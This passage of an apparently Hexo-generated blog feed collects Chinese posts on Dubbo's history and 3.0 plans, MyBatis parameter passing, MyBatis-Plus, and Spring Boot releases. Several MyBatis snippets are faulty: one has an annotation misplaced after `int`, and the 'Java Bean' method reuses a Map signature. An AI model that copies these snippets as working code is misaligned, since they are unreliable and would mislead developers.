开源了dubbox。</p><p><strong>2018&#x2F;01&#x2F;22：</strong> Dubbo Spring Boot 版正式发布：<a href="https://mp.weixin.qq.com/s/yCcIMcn1MfwItycsPFgfOA">dubbo-spring-boot-starter</a> v1.0.0 公测版。</p><p><strong>2018&#x2F;02&#x2F;09：</strong> Dubbo 通过投票正式进入 Apache 基金会孵化器，更新了 Apache 官方域名，也不再仅限于 Java 语言。</p><p>参考：</p><ul><li><a href="https://mp.weixin.qq.com/s/c5p9VW7Pfe1Hv2S-vvFaLQ">Dubbo正式进入Apache基金会孵化器</a></li><li><a href="https://mp.weixin.qq.com/s/ZkFh851uwLJwT2cxYNuFWg">Dubbo域名已改，也不再局限于Java！</a></li></ul><p><strong>2019&#x2F;05&#x2F;20：</strong> Apache软件基金会宣布 Dubbo 正式毕业，成为 Apache 的顶级项目。</p><p>……</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>惊艳，Dubbo域名已改，也不再局限于Java</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/%E6%83%8A%E8%89%B3%EF%BC%8CDubbo%E5%9F%9F%E5%90%8D%E5%B7%B2%E6%94%B9%EF%BC%8C%E4%B9%9F%E4%B8%8D%E5%86%8D%E5%B1%80%E9%99%90%E4%BA%8EJava/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/%E6%83%8A%E8%89%B3%EF%BC%8CDubbo%E5%9F%9F%E5%90%8D%E5%B7%B2%E6%94%B9%EF%BC%8C%E4%B9%9F%E4%B8%8D%E5%86%8D%E5%B1%80%E9%99%90%E4%BA%8EJava/</url>
      
        <content type="html"><![CDATA[<p>今天作者想去 Dubbo 官网查下相关资料，发现官方域名由 dubbo.io 直接跳转至 dubbo.apache.org 下了，然后突然回想起 Dubbo 已经在 2 月份正式进入了 Apache 孵化器这回事，也就不觉得奇怪了。</p><p><img src="http://img.javastack.cn/18-7-9/56099502.jpg"></p><p>看这个新官网还真清新亮丽，对比之前的老官网，这次调整还真不少，我想我有必要给大家重新介绍一下 Dubbo, 结合这次的变更下面给大家总结一下。</p><h4 id="什么是-Dubbo"><a href="#什么是-Dubbo" class="headerlink" title="什么是 Dubbo ?"></a>什么是 Dubbo ?</h4><p>Apache Dubbo (incubating) |ˈdʌbəʊ| 是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。</p><p><img src="http://img.javastack.cn/18-7-9/39131991.jpg" alt="image"></p><p>这里有一篇 Dubbo 详解的好文：<a href="https://mp.weixin.qq.com/s/q8S3Ihas0KXVMfbdNjau0w">Dubbo架构设计详解</a>，可以了解更多。</p><h4 id="Dubbo主要特性"><a href="#Dubbo主要特性" class="headerlink" title="Dubbo主要特性"></a>Dubbo主要特性</h4><ul><li>面向接口代理的高性能RPC调用</li><li>服务自动注册与发现</li><li>运行期流量调度</li><li>智能负载均衡</li><li>高度可扩展能力</li><li>可视化的服务治理与运维</li></ul><h4 id="Dubbo新变化"><a href="#Dubbo新变化" class="headerlink" title="Dubbo新变化"></a>Dubbo新变化</h4><p>1、官网切换了新域名：dubbo.apache.org。</p><p>2、官网支持中英文切换，默认为英文。</p><p>3、最大的调整和亮点是 Dubbo 开始多语言，不再是 Java 专属，还支持 Node.js、Python、php 等，部分语言的正式版还未发布。</p><p>4、支持 4 种方式启动：Spring XML、Spring Annotation、Plain Java、Spring-boot。</p><p>更多可以查看 Dubbo 的生态系统介绍：<a href="http://dubbo.apache.org/#/community?lang=zh-cn%E3%80%82">http://dubbo.apache.org/#/community?lang=zh-cn。</a></p><p><img src="http://img.javastack.cn/18-7-9/54361098.jpg"></p><h4 id="Dubbo近况与未来"><a href="#Dubbo近况与未来" class="headerlink" title="Dubbo近况与未来"></a>Dubbo近况与未来</h4><p>看 Dubbo 最近的事件和新闻，它又活了，活得更好，在前两天的《<a href="https://mp.weixin.qq.com/s/XdlYAOA83uvgJiwypoeL0w">全球架构师峰会</a>》上也有相关企业介绍了 Dubbo 在他们公司作为微服务框架的使用情况，所以 Dubbo 将会越来越好。</p><p><img src="http://img.javastack.cn/18-7-9/36350632.jpg"></p><p>现在开始你的第一个 Dubbo 应用吧！欢迎转发，祝 Dubbo 越来越强大！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重大利好，Dubbo 3.0要来了</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/%E9%87%8D%E5%A4%A7%E5%88%A9%E5%A5%BD%EF%BC%8CDubbo%203.0%E8%A6%81%E6%9D%A5%E4%BA%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/%E9%87%8D%E5%A4%A7%E5%88%A9%E5%A5%BD%EF%BC%8CDubbo%203.0%E8%A6%81%E6%9D%A5%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-1-14/18942154.jpg"><br>关于Dubbo的好消息，2018年1月8日，Dubbo创始人之一梁飞在Dubbo交流群里透露了Dubbo 3.0正在开工的重大消息。</p><p><img src="http://img.javastack.cn/18-1-14/45555392.jpg"></p><p>Dubbo是阿里开源的分布式框架，已经多年停止更新处于半死不活状态，又于2017年又开始更新满血复活重新得到关注。Dubbo在复活后，一直保持着小步快跑的阶段，现在又带来这样一个3.0的重大变革，让大家更加关注Dubbo的发展，希望Dubbo真正完成涅磐重生！ </p><p>据网上可靠消息，目前Dubbo　3.0已正式投入全职开发梯队，初步Runtime已在验证，3月底将在线上应用投入使用。 </p><p><strong>Dubbo 3.0新特性前瞻</strong></p><p>据消息，Dubbo 3.0内核与Dubbo 2.0完全不同，但它会兼容2.0。</p><p>Dubbo 3.0将以Streaming为内核，而不再是2.0时代的RPC，但是RPC会在 3.0中变成远程Streaming对接的一种可选形态。Dubbo 3.0给出了一个内核接口：Streaming　docking(Streaming），一切服务治理将围绕这个内核接口进行扩展。而Streaming通道与gRPC类似，支持HTTP&#x2F;2，同时REST接口也会受到一等公民支持。</p><p>Dubbo 3.0在通讯上的改动并不大，重点是在服务治理和编程模型上。说到编程模型的革新，梁飞透露，此次Dubbo3.0能够开工主要也是因为新特性将去掉一切阻塞，以“一切同步”为第一目标，在对IO密集业务的处理上，它能够提高机器利用率，使得一半机器的成本被节省下来。他还表示，其实Dubbo 3.0技术选型重大变更的驱动因素，也就是降低成本，因为在将系统服务化后，全业务线的机器都在等待返回数据，负载压不上去，机器浪费严重。</p><p>这个去阻塞化的模式，其实就是使用了“反应式编程”模式（Reactive Programming），在Dubbo　3.0中，reactive将成为核心，会做到客户端、服务端、缓存和数据库，全程无阻塞。在数据库上，JDBC驱动将进行更改，同时为了性能还会配合使用阿里毕玄对JVM协程的改造。更为重要的是，这个重大变更不仅体现在Dubbo上，它也将影响到阿里10年来积累的中间件。 </p><p>群里有人问到是否会采用Service Mesh，梁飞表示Dubbo 3.0将支持可选 mesh，多加一层 IPC，这主要是为了兼容老系统；而内部则会优先尝试内嵌模式。他说代理模式Ops可独立升级框架，减少业务侵入，而内嵌模式可以带业务测试、部署节点少、稳定性检测方便。同时可以将Dubbo 3.0 启动为独立进程，由dubbo-mesh进行IPC，路由、负载均衡和熔断机制将由独立进程控制。 </p><p>鉴于Dubbo 3.0的新特性，我们可以拭目以待!</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyBatis 传递多个参数的 4 种方式</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/MyBatis/MyBatis%20%E4%BC%A0%E9%80%92%E5%A4%9A%E4%B8%AA%E5%8F%82%E6%95%B0%E7%9A%84%204%20%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/MyBatis/MyBatis%20%E4%BC%A0%E9%80%92%E5%A4%9A%E4%B8%AA%E5%8F%82%E6%95%B0%E7%9A%84%204%20%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-1-20/16848962.jpg" alt="image"></p><p>现在大多项目都是使用Mybatis了，但也有些公司使用Hibernate。使用Mybatis最大的特性就是sql需要自己写，而写sql就需要传递多个参数。面对各种复杂的业务场景，传递参数也是一种学问。</p><p><strong>下面给大家总结了以下几种多参数传递的方法。</strong></p><p><strong>方法1：顺序传参法</strong></p><pre class="line-numbers language-none"><code class="language-none">public User selectUser(String name, int deptId);&lt;select id&#x3D;&quot;selectUser&quot; resultMap&#x3D;&quot;UserResultMap&quot;&gt;    select * from user    where user_name &#x3D; #&#123;0&#125; and dept_id &#x3D; #&#123;1&#125;&lt;&#x2F;select&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>#{}</code>里面的数字代表你传入参数的顺序。</p><p>这种方法不建议使用，sql层表达不直观，且一旦顺序调整容易出错。</p><p><strong>方法2：@Param注解传参法</strong></p><pre class="line-numbers language-none"><code class="language-none">public User selectUser(@Param(&quot;userName&quot;) String name, int @Param(&quot;deptId&quot;) deptId);&lt;select id&#x3D;&quot;selectUser&quot; resultMap&#x3D;&quot;UserResultMap&quot;&gt;    select * from user    where user_name &#x3D; #&#123;userName&#125; and dept_id &#x3D; #&#123;deptId&#125;&lt;&#x2F;select&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>#{}</code>里面的名称对应的是注解<code>@Param</code>括号里面修饰的名称。</p><p>这种方法在参数不多的情况还是比较直观的，推荐使用。</p><p><strong>方法3：Map传参法</strong></p><pre class="line-numbers language-none"><code class="language-none">public User selectUser(Map&lt;String, Object&gt; params);&lt;select id&#x3D;&quot;selectUser&quot; parameterType&#x3D;&quot;java.util.Map&quot; resultMap&#x3D;&quot;UserResultMap&quot;&gt;    select * from user    where user_name &#x3D; #&#123;userName&#125; and dept_id &#x3D; #&#123;deptId&#125;&lt;&#x2F;select&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>#{}</code>里面的名称对应的是<code>Map</code>里面的key名称。</p><p>这种方法适合传递多个参数，且参数易变能灵活传递的情况。</p><p><strong>方法4：Java Bean传参法</strong></p><pre class="line-numbers language-none"><code class="language-none">public User selectUser(Map&lt;String, Object&gt; params);&lt;select id&#x3D;&quot;selectUser&quot; parameterType&#x3D;&quot;com.test.User&quot; resultMap&#x3D;&quot;UserResultMap&quot;&gt;    select * from user    where user_name &#x3D; #&#123;userName&#125; and dept_id &#x3D; #&#123;deptId&#125;&lt;&#x2F;select&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>#{}</code>里面的名称对应的是<code>User</code>类里面的成员属性。</p><p>这种方法很直观，但需要建一个实体类，扩展不容易，需要加属性，看情况使用。</p><p>有收获的话，分享下朋友圈给更多的人吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一款 MyBatis 开发神器，为简化而生</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/MyBatis/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%20MyBatis%20%E5%BC%80%E5%8F%91%E7%A5%9E%E5%99%A8%EF%BC%8C%E4%B8%BA%E7%AE%80%E5%8C%96%E8%80%8C%E7%94%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/MyBatis/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%20MyBatis%20%E5%BC%80%E5%8F%91%E7%A5%9E%E5%99%A8%EF%BC%8C%E4%B8%BA%E7%AE%80%E5%8C%96%E8%80%8C%E7%94%9F/</url>
      
        <content type="html"><![CDATA[<p>今天栈长给使用 MyBatis 的同学推荐一款神器：MyBatis-Plus，简称 MP，它是一个 MyBatis 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。</p><p>愿景就是成为 MyBatis 最好的搭档，就像魂斗罗中的 1P、2P，基友搭配，效率翻倍。</p><p><img src="http://img.javastack.cn/20190529110805.png"></p><p>官网地址：</p><blockquote><p><a href="https://mybatis.plus/">https://mybatis.plus/</a></p></blockquote><p>Github地址：</p><blockquote><p><a href="https://github.com/baomidou/mybatis-plus">https://github.com/baomidou/mybatis-plus</a></p></blockquote><p>现在已经超过 5K+ Star 了。。</p><p><img src="http://img.javastack.cn/20190529111707.png"></p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>无侵入：只做增强不做改变，引入它不会对现有工程产生影响，如丝般顺滑</li><li>损耗小：启动即会自动注入基本 CURD，性能基本无损耗，直接面向对象操作</li><li>强大的 CRUD 操作：内置通用 Mapper、通用 Service，仅仅通过少量配置即可实现单表大部分 CRUD 操作，更有强大的条件构造器，满足各类使用需求</li><li>支持 Lambda 形式调用：通过 Lambda 表达式，方便的编写各类查询条件，无需再担心字段写错</li><li>支持多种数据库：支持 MySQL、MariaDB、Oracle、DB2、H2、HSQL、SQLite、Postgre、SQLServer2005、SQLServer 等多种数据库</li><li>支持主键自动生成：支持多达 4 种主键策略（内含分布式唯一 ID 生成器 - Sequence），可自由配置，完美解决主键问题</li><li>支持 XML 热加载：Mapper 对应的 XML 支持热加载，对于简单的 CRUD 操作，甚至可以无 XML 启动</li><li>支持 ActiveRecord 模式：支持 ActiveRecord 形式调用，实体类只需继承 Model 类即可进行强大的 CRUD 操作</li><li>支持自定义全局通用操作：支持全局通用方法注入（ Write once, use anywhere ）</li><li>支持关键词自动转义：支持数据库关键词（order、key……）自动转义，还可自定义关键词</li><li>内置代码生成器：采用代码或者 Maven 插件可快速生成 Mapper 、 Model 、 Service 、 Controller 层代码，支持模板引擎，更有超多自定义配置等您来使用</li><li>内置分页插件：基于 MyBatis 物理分页，开发者无需关心具体操作，配置好插件之后，写分页等同于普通 List 查询</li><li>内置性能分析插件：可输出 Sql 语句以及其执行时间，建议开发测试时启用该功能，能快速揪出慢查询</li><li>内置全局拦截插件：提供全表 delete 、 update 操作智能分析阻断，也可自定义拦截规则，预防误操作</li><li>内置 Sql 注入剥离器：支持 Sql 注入剥离，有效预防 Sql 注入攻击</li></ul><h2 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h2><p><img src="http://img.javastack.cn/20190529110859.png"></p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><h4 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h4><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;com.baomidou&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;mybatis-plus-boot-starter&lt;&#x2F;artifactId&gt;    &lt;version&gt;3.1.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、继承通用接口"><a href="#2、继承通用接口" class="headerlink" title="2、继承通用接口"></a>2、继承通用接口</h4><pre class="line-numbers language-none"><code class="language-none">public interface UserMapper extends BaseMapper&lt;User&gt; &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3、查询"><a href="#3、查询" class="headerlink" title="3、查询"></a>3、查询</h4><pre class="line-numbers language-none"><code class="language-none">List&lt;User&gt; userList &#x3D; userMapper.selectList(        new QueryWrapper&lt;User&gt;()                .lambda()                .ge(User::getAge, 18));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MyBatis-Plus将会生成以下查询SQL：</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM user WHERE age &gt;&#x3D; 18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 1.5.10 发布：修复重要安全漏洞！！！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%201.5.10%20%E5%8F%91%E5%B8%83%EF%BC%9A%E4%BF%AE%E5%A4%8D%E9%87%8D%E8%A6%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%81%EF%BC%81%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%201.5.10%20%E5%8F%91%E5%B8%83%EF%BC%9A%E4%BF%AE%E5%A4%8D%E9%87%8D%E8%A6%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%81%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-1-31/1092928.jpg" alt="image"><br><strong>2018&#x2F;01&#x2F;31，Spring Boot团队发布了Spring Boot 1.5.10。</strong></p><p><strong>Maven：</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;parent&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.5.10.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;parent&gt;&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;    &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Gradle：</strong></p><pre class="line-numbers language-none"><code class="language-none">dependencies &#123;    compile(&quot;org.springframework.boot:spring-boot-starter-web:1.5.10.RELEASE&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Spring Boot 1.5.10 已经正式提交到了以下仓库中。</p><blockquote><p><a href="https://repo.spring.io/release/">https://repo.spring.io/release\</a><br><a href="https://search.maven.org/">https://search.maven.org/</a></p></blockquote><p><strong>这个版本主要修复了一个重要安全漏洞（CVE-2018-1196）！！！</strong></p><p>这个漏洞会威胁到所有使用Spring Boot的系统，这个漏洞的披露详情将很快公布。</p><p><strong>此外，该版本还将依赖的Spring Security包升级到了最新版本（修复了漏洞CVE-2017-8030）。</strong></p><p>CVE-2017-8030漏洞可见说明：</p><blockquote><p><a href="https://pivotal.io/security/cve-2017-8030">https://pivotal.io/security/cve-2017-8030</a></p></blockquote><p><strong>除了安全漏洞修复，Spring Boot 1.5.10还修复了超过55+的bug，其他改善，及一些依赖包的版本更新。</strong></p><p>大家可以在Spring Boot官网看到最新的发布版本。</p><blockquote><p><a href="https://projects.spring.io/spring-boot/">https://projects.spring.io/spring-boot/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.0 正式发布！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.0%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.0%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-3-1/6871468.jpg" alt="image"></p><h4 id="Spring-Boot-2-0-正式发布！"><a href="#Spring-Boot-2-0-正式发布！" class="headerlink" title="Spring Boot 2.0 正式发布！"></a>Spring Boot 2.0 正式发布！</h4><p>2018&#x2F;03&#x2F;01最新消息，传得沸沸扬扬的Spring Boot 2.0 正式发布了。</p><p>小编去看了下Spring Boot的官网，正式版本已经释放出来了！！！</p><p><img src="http://img.javastack.cn/18-3-1/48186693.jpg"></p><p><strong>这个版本更是历经了17个月，超过了215个人共同开发，总共超过6800次+提交完成的。这个版本是继4年前Spring Boot 1.0 之后的第一个主要版本，也是第一个正式支持Spring Framework 5.0的发行版本。</strong></p><p>我们也从Github上Spring Boot发布版本列表中看到了Spring Boot 2.0 的正式发布版本，版本号：v2.0.0.RELEASE。</p><blockquote><p>Spring Boot版本发布列表：<a href="https://github.com/spring-projects/spring-boot/releases/">https://github.com/spring-projects/spring-boot/releases/</a></p></blockquote><p><img src="http://img.javastack.cn/18-3-1/85348337.jpg"></p><h4 id="Spring-Boot-2-0-新特性"><a href="#Spring-Boot-2-0-新特性" class="headerlink" title="Spring Boot 2.0 新特性"></a>Spring Boot 2.0 新特性</h4><p>说了这么多，Spring Boot 2.0 和 1.0 比都有哪些变动和新特性呢？</p><ul><li>JDK最低要求1.8+，并支持1.9；</li><li>支持Spring webflux&#x2F;webflux.fn响应式的web编程；</li><li>提供Spring Data Cassandra, MongoDB, Couchbase和Redis的响应式自动配置及starter POMs；</li><li>支持嵌入式的Netty；</li><li>HTTP&#x2F;2的支持：Tomcat, Undertow and Jetty；</li><li>全新的体系结构，支持Spring MVC、WebFlux和Jersey；</li><li>增强了Micrometer集成，以Atlas, Datadog, Ganglia, Graphite, Influx, JMX, New Relic, Prometheus, SignalFx, StatsD and Wavefront为基础的度量指标；</li><li>Quartz调度支持；</li><li>极大简化了安全自动配置；</li></ul><blockquote><p>更多详细的新特性请看官方说明： <a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Release-Notes">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Release-Notes</a></p></blockquote><p>需要注意的是，许多配置属性在 Spring Boot 2.0 中已经被重命名或被删除，为了方便从 1.x 升级，Spring Boot 发布了一个新的 spring-boot-properties-migrator 模块。只要将其作为依赖添加到项目中，它不仅会分析应用程序的环境并在启动时打印诊断信息，而且还会在运行时阶段为项目临时将属性迁移至新的配置方式。</p><blockquote><p>升级文档：<a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide</a></p></blockquote><p>还不知道Spring Boot技术或者还不够深入了解的，我们准备了一系列的Spring Boot实战教程，可以点击左下方的阅读原文进行深入学习。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.1.0 已发布，7 个重大更新！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.1.0%20%E5%B7%B2%E5%8F%91%E5%B8%83%EF%BC%8C7%20%E4%B8%AA%E9%87%8D%E5%A4%A7%E6%9B%B4%E6%96%B0%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.1.0%20%E5%B7%B2%E5%8F%91%E5%B8%83%EF%BC%8C7%20%E4%B8%AA%E9%87%8D%E5%A4%A7%E6%9B%B4%E6%96%B0%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>距离《<a href="https://mp.weixin.qq.com/s/VMIHit6kB9MVYhxX2Qx2DA">重磅：Spring Boot 2.0 正式发布！</a>》已经过去大半年了，而 Spring Boot 2.1.0 在 10 月底就发布了，我们来看下 Spring Boot 2.1.0 都更新了什么，每一个 Java 技术人都值得关注。</p><p>栈长其实早就看到了更新了，现在才有时间来更新下。</p><h2 id="1、第三方类库升级"><a href="#1、第三方类库升级" class="headerlink" title="1、第三方类库升级"></a>1、第三方类库升级</h2><ul><li>Hibernate 5.3</li><li>Micrometer 1.1</li><li>Reactor Californium</li><li>Spring Data Lovelace</li><li>Spring Framework 5.1</li><li>Tomcat 9</li><li>Undertow 2</li></ul><p>主要就更新了这些类库，其实远不止这些。</p><h2 id="2、性能提升"><a href="#2、性能提升" class="headerlink" title="2、性能提升"></a>2、性能提升</h2><h4 id="1）应用程序性能"><a href="#1）应用程序性能" class="headerlink" title="1）应用程序性能"></a>1）应用程序性能</h4><p>改进性能作为 Spring Boot 团队持续努力的一部分，性能提升在 Spring Boot 2.1 中取得了一些重大进展。</p><p>现在 Spring Boot 2.1+ 应用程序启动速度变得更快，并且消耗的内存更少，这在内存非常稀缺的应用环境中尤其重要。</p><h4 id="2）异步引导-Hibernate"><a href="#2）异步引导-Hibernate" class="headerlink" title="2）异步引导 Hibernate"></a>2）异步引导 Hibernate</h4><p>在 Spring Boot 2.1 中还采用了 Spring 框架和 Spring Data JPA 框架对 Hibernate 异步引导的支持。</p><p>如果你使用了 Spring Data JPA 框架，并设置了下面的参数，那么 Hibernate 将在一个独立的线程中启动，而其他应用程序的启动是同时并行的。</p><blockquote><p>spring.data.jpa.repositories.bootstrap-mode&#x3D;deferred</p></blockquote><h2 id="3、支持-Java-11"><a href="#3、支持-Java-11" class="headerlink" title="3、支持 Java 11"></a>3、支持 Java 11</h2><p>随着 Spring 5.1 对 Java 11 的支持，Spring Boot 2.1 现在也可以支持 Java 11 了，同时还可以与 Java 8 兼容。</p><h2 id="4、支持参数数据大小"><a href="#4、支持参数数据大小" class="headerlink" title="4、支持参数数据大小"></a>4、支持参数数据大小</h2><p>当你在 <code>application.properties</code> 配置文件配置参数时，如果一个参数的值需要表示成字节数或者其他的单位，你可以为参数的值指定单位（如：10MB），就像在 Spring Boot 2.0 中对 <code>Duration</code> 的支持一样，它可以转换成为：<code>org.springframework.util.unit.DataSize</code> 类。</p><p>所有支持的单位可以看这个类：</p><blockquote><p>org.springframework.util.unit.DataUnit</p></blockquote><h2 id="5、执行端点"><a href="#5、执行端点" class="headerlink" title="5、执行端点"></a>5、执行端点</h2><h4 id="1）添加了两个新端点"><a href="#1）添加了两个新端点" class="headerlink" title="1）添加了两个新端点"></a>1）添加了两个新端点</h4><p>Spring Boot 2.1 中添加了两个新的执行端点。</p><ul><li><strong>&#x2F;actuator&#x2F;caches</strong>：提供应用程序的缓存管理信息。</li><li><strong>&#x2F;actuator&#x2F;integrationgraph</strong>：提供对 Spring 集成的组件图形化展现。</li></ul><h4 id="2）健康端点加强"><a href="#2）健康端点加强" class="headerlink" title="2）健康端点加强"></a>2）健康端点加强</h4><p>健康端点允许访问一个独立的组件健康状态，如：<code>/actuator/health/db</code> 将只执行 <code>db</code> 的健康端点。</p><h2 id="6、度量"><a href="#6、度量" class="headerlink" title="6、度量"></a>6、度量</h2><p>度量这块，除了升级到 Micrometer 1.1，还增加了用于导出到 AppOptics, Humio 和 KariosDB 的自动配置。</p><p>度量标准覆盖率也得到了改进，包括：</p><ul><li>Hibernate metrics</li><li>Spring Framework’s WebClient</li><li>Kafka consumer metrics</li><li>Log4j2 metrics</li><li>Jetty server thread pool metrics</li><li>Server-side Jersey HTTP request metrics</li></ul><h2 id="7、其他更新"><a href="#7、其他更新" class="headerlink" title="7、其他更新"></a>7、其他更新</h2><p>在版本更新说明中，还有大量的其他更改和提升，你也可以找到计划在下一个版本要删除的类和方法的列表。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p> Spring Boot 团队想借此机会，再次感谢所有的用户和贡献者，现在已经有超过 500 多人向 Spring Boot 提交代码，并且有超过 19,000 多次提交。</p><p> 如果你有更好的想法想要贡献给 Spring Boot，可以去 Spring Boot 官方仓库进行代码提交。</p><blockquote><p>更新说明：<a href="https://spring.io/blog/2018/10/30/spring-boot-2-1-0">https://spring.io/blog/2018/10/30/spring-boot-2-1-0</a></p></blockquote><p>栈长现在还在用 2.0，你们用的 Spring Boot 什么版本呢？你们期待 Spring Boot 添加什么样的功能？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.1.5 正式发布，1.5.x 即将结束使命！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.1.5%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C1.5.x%20%E5%8D%B3%E5%B0%86%E7%BB%93%E6%9D%9F%E4%BD%BF%E5%91%BD%EF%BC%81/"/>
